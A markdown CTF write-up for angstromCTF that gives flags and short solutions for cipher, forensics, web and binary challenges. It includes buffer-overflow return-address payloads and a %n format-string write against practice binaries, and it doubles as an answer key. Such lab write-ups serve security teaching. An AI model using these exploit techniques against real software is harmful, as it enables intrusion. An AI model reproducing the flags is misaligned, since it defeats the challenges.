# angstromCTF

AngstromCTF is created by several students, all at MBHS.

## Overview

**URL:** https://angstromctf.com/ (site will remain online)  
**Organisors:** Students at Montgomery Blair High School.  
**Duration:** 7 days  
**Team:** [shiltemann](https://github.com/shiltemann),
[Liblor](https://github.com/Liblor)

```
Title                         Category     Points  Flag
----------------------------- ------------ ------- --------------------------
Recovery                      forensics    10      waw_ctrl_f_was_sooper_afective
SPQR                          crypto       10      beware_the_ides_of_march
What the Hex                  crypto       15
Amoebananas!                  web          20      pseudopods_are_da_bomb
Artifact                      crypto       20      classics_are_always_in_style
Headsup                       forensics    30
SuperSecure™                  web          30      all_javascript_is_open
Whoops                        forensics    30
Endian of the World           binary       40      a_doomsday_device_is_only_useful_if_everyone_knows_about_it
Brute Force                   crypto       40
Not a Pastry                  web          40      good_ole_fashioned_homemade_cookies
ASM Tracing                   re           45      1775929344
Java is the Best              re           50
Overflow 1                    binary       50      overflow_underflow_youreaflow_imaflow
Shakespeare                   crypto       60
Shellcode                     binary       60      nonexecutable_stack_would_be_a_good_idea
Yankovic                      forensics    60
Overflow 2                    binary       70      youre_lucky_i_left_that_function_for_you
Smartest Encryption           re           70
Fender Blender                forensics    70
Wher iz mai cheezburgr        forensics    80
volatile                      forensics    90
What a Drag                   crypto       90
Sea Cipher 1                  re           100
Format 1                      binary       100     is_%n_used_for_anything_besides_this
Answer Machine                binary       110
åCTF Casino                   crypto       120
metasploitable                forensics    120
Music To My Ears              forensics    130
Flag Locker                   Web          140
rop2libc                      binary       160
My Accountant                 crypto       160
Help Center                   crypto       170
Sea Cipher 2                  re           170
RSA Fun                       crypto       240
Randomized Cipher             crypto       250
```


## Recovery

**Challenge**  
We recieved this disk image from the No Such Agency a few days ago. A hacker hid the password for his computer in this image. Can you find it for us?

**Solution**  
Firstly we checked if it is a special file type, because `file` couldn't match
it with a known file type we looked for a string with the word `flag` in the
file. Bingo!

```
$ file recovered.img
recovered.img: data
$ strings recovered.img | grep flag
flag{waw_ctrl_f_was_sooper_afective}
```

**Flag**
```
waw_ctrl_f_was_sooper_afective
```


## SPQR

**Challenge**  
We found this message written on a piece of parchment in the ruins of ancient
Rome. What could it mean?  
uxptkx_max_bwxl_hy_ftkva

**Solution**  
If you've already solved some CTFs or if you have some basic knowledge in
cryptography, you will be familiar with the caesar cipher. The easiest way is
to brute forece all 25 substitutions.
To decode the text, shift all letters by 7 in the alphabet.

**Flag**
```
beware_the_ides_of_march
```


##  Amoebananas!

**Challenge**  
The [amoeba](http://web.angstromctf.com:1337/) is a fascinating creature.

**Solution**  
We only have to look at the source code of the website, the flag is included as
comment.

    <!-- Your flag is: pseudopods_are_da_bomb -->

**Flag**  
```
pseudopods_are_da_bomb
```


## Artifact

**Challenge**  
This challenge also looks like a substitution cipher. You could surely perform a
frequency analysis by hand, but it's way easier to use a program like
http://quipqiup.com/index.php.

**Solution**  

```
'through me you pass into the city of woe:
through me you pass into eternal pain:
through me among the people lost for aye.
justice the founder of my fabric moved:
to rear me was the task of power divine,
supremest wisdom,
and primeval love.
before me things create were none,
save things eternal,
and eternal i shall endure.
all hope abandon, ye who enter here.'
the flag is classics_are_always_in_style
```

**Flag**  

```
classics_are_always_in_style
```


## Endian of the World

**Challenge**  
The end of the world is nigh! Dr. Doomsday has created an evil contraption to
destroy the planet, and only a single password can stop it! We were able to
recover the source code for the password check. Find the shortest password that
will stop Dr. Doomsday's machine and save the world! The program is available
on the shell server at /problems/endian_of_the_world/, and the binary and
[source](writeupfiles/endian.c) are provided.

**Solution**  
The password is in the source scattered in multiple hex digits.
The binary is a x86 file, that implies little endian.   
This script calculates the ascii letters:

```
#!/usr/bin/env python3
import binascii

l = ['0x6f645f61', '0x64736d6f', '0x645f7961', '0x63697665', '0x73695f65',
     '0x6c6e6f5f', '0x73755f79', '0x6c756665', '0x5f66695f', '0x72657665',
     '0x656e6f79', '0x6f6e6b5f', '0x615f7377', '0x74756f62', '0x0a74695f']
out = ""
for i in l:
    out += binascii.unhexlify(i[2:])[::-1].decode()
print(out)
```

**Flag**  
```
a_doomsday_device_is_only_useful_if_everyone_knows_about_it
```


## Overflow 1

**Challenge**  
This program is vulnerable to a buffer overflow! Can you exploit it to run a
shell and get the flag? You can solve this problem on our shell server at
/problems/overflow1, and the [binary](writeupfiles/overflow1) and
[source](writeupfiles/overflow1.c) are provided.

**Solution**  
This is the solution for the 32bit [overflow1](writeupfiles/overflow1_old)
version.
```
$ ./overflow1 $(python -c 'print "A"*16+"\xEF\xBE\xAD\xDE"')
```

**Flag**  
```
overflow_underflow_youreaflow_imaflow
```


## Overflow 2

**Challenge**  
Another program, another buffer overflow vulnerability! This time, though,
there should be no way to get a shell! See if you can prove us wrong and get
the flag on our shell sever. The binary for this problem is
[here](writeupfiles/overflow2), and source code is
[here](writeupfiles/overflow2.c).

**Solution**  
This is the solution for the 32bit overflow2 (Can't find a backup right now).
```
$ ./overflow2 $(python -c 'print "A"*16+"\xDD\x84\x04\x08"*4')
```

**Flag**  
```
youre_lucky_i_left_that_function_for_you
```


## Format 1

**Challenge**  
This program is vulnerable to a format string attack! Try supplying a format
string to overwrite a global variable and get a shell! You can exploit the
binary on our shell server at /problems/format1/. Download the binary here,
and source code is available here

**Solution**  
This is the solution for the 32bit format1 (Can't find a backup right now).
```
$ python -c 'print  "\x40\xa0\x04\x08%188x%7$n\n"' > ~/test
$ cat ~/test - | ./format1
$ cat flag.txt
```

**Flag**  
```
is_%n_used_for_anything_besides_this
```
